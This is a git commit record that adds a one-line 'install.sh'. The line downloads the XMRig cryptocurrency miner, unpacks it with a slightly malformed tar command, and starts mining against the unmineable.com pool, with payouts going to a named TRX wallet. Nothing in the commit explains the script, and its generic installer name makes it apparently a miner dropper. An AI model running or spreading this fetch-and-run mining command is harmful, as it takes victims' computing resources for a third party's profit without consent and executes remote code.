a80702ee7b4c0c7b96f09562c7ab641fc30d6453
michaelwest2 <137062855+michaelwest2@users.noreply.github.com>
2023-06-19 12:03:59 +0100

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.3/xmrig-6.19.3-linux-x64.tar.gz && tar -xvf xmrig xmrig-6.19.3-linux-x64.tar.gz && cd xmrig-6.19.3 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TUgkZF2iakKkeZnEJfZKvFhuBC6ACiavPq.hgsvps -p x
